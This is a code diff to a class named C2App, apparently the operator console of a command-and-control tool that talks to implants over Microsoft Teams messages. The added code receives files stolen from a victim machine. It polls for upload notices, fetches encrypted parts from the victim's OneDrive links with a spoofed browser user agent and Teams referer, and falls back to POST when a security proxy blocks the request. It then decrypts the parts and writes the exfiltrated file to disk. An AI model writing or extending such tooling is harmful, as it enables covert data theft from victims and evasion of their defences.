@@ -718,6 +718,37 @@ class C2App(App):
                     if OUT_START in content and OUT_END in content:
                         output = _extract_between(content, OUT_START, OUT_END)
                         sender = msg.get("imdisplayname", "Client")
+
+                        # DOWNLOAD_START: Client is about to upload N parts.
+                        # Extend the deadline and keep polling for DOWNLOAD_PARTS.
+                        if output.startswith("[DOWNLOAD_START "):
+                            inner = output[len("[DOWNLOAD_START "): -1].strip().split()
+                            if len(inner) >= 2:
+                                try:
+                                    part_count_hint = int(inner[1])
+                                    deadline = time.time() + max(
+                                        SERVER_POLL_TIMEOUT,
+                                        part_count_hint * 90 + 60
+                                    )
+                                    _tui_log(
+                                        f"[*] Client is uploading '{inner[0]}' "
+                                        f"({part_count_hint} part(s)) — deadline extended.",
+                                        "info"
+                                    )
+                                except ValueError:
+                                    pass
+                            # Advance watermark so DOWNLOAD_START is not reprocessed.
+                            sent_at_epoch = max(sent_at_epoch, msg_id)
+                            break  # re-poll for DOWNLOAD_PARTS
+
+                        # DOWNLOAD_PARTS: Client sent direct OneDrive URLs.
+                        # Handle the download, then exit the polling loop.
+                        if output.startswith("[DOWNLOAD_PARTS "):
+                            self._handle_output(output, sender)
+                            deadline = 0
+                            break
+
+                        # All other responses: handle and exit.
                         self._handle_output(output, sender)
                         deadline = 0
                         break
@@ -875,6 +906,78 @@ class C2App(App):
                     _tui_log(f"[+] Screenshot saved: {save_path}", "success")
                 except Exception as e:
                     _tui_log(f"[-] Screenshot save error: {e}", "error")
+            return
+
+
+        if output.startswith("[DOWNLOAD_PARTS "):
+            # Format: [DOWNLOAD_PARTS <filename> <count> <url0> <url1> ...]
+            inner = output[len("[DOWNLOAD_PARTS "): -1].strip()
+            parts = inner.split(" ", 2)
+            if len(parts) < 3:
+                _tui_log(f"[-] Malformed DOWNLOAD_PARTS: {output[:80]}", "error")
+                return
+            fname      = parts[0].strip()
+            part_count = int(parts[1].strip())
+            urls       = parts[2].strip().split(" ")
+            _tui_log(
+                f"[*] Receiving '{fname}' in {part_count} part(s) from Client's OneDrive…",
+                "info"
+            )
+            session = self._server_tokens["session"]
+            all_bytes = b""
+            ok = True
+            for i, url in enumerate(urls):
+                url = url.strip()
+                if not url:
+                    continue
+                try:
+                    # Try GET first; fall back to POST if Netscope blocks it
+                    r = session.get(
+                        url,
+                        headers={
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                                          "AppleWebKit/537.36 (KHTML, like Gecko) "
+                                          "Chrome/150.0.0.0 Safari/537.36",
+                            "Accept": "*/*",
+                            "Referer": "https://teams.live.com/",
+                        },
+                        allow_redirects=True, timeout=300,
+                    )
+                    if r.status_code != 200 or len(r.content) == 0:
+                        r = session.post(
+                            url,
+                            headers={
+                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                                              "AppleWebKit/537.36 (KHTML, like Gecko) "
+                                              "Chrome/150.0.0.0 Safari/537.36",
+                                "Content-Length": "0",
+                            },
+                            allow_redirects=True, timeout=300,
+                        )
+                    if r.status_code != 200:
+                        _tui_log(f"[-] Part {i+1}/{part_count} fetch failed: HTTP {r.status_code}", "error")
+                        ok = False
+                        break
+                    all_bytes += r.content
+                    pct = int((i + 1) / part_count * 100)
+                    _tui_log(f"  [{pct:3d}%] part {i+1}/{part_count} fetched ({len(r.content):,} bytes)", "info")
+                except Exception as e:
+                    _tui_log(f"[-] Part {i+1} fetch error: {e}", "error")
+                    ok = False
+                    break
+            if ok and all_bytes:
+                try:
+                    plain     = decrypt_file(all_bytes)
+                    save_path = os.path.join(os.getcwd(), fname)
+                    with open(save_path, "wb") as fh:
+                        fh.write(plain)
+                    _tui_log(
+                        f"[+] File received: {save_path} "
+                        f"({len(plain):,} bytes, {part_count} part(s), decrypted OK)",
+                        "success"
+                    )
+                except Exception as e:
+                    _tui_log(f"[-] Decrypt/save error: {e}", "error")
             return
 
 
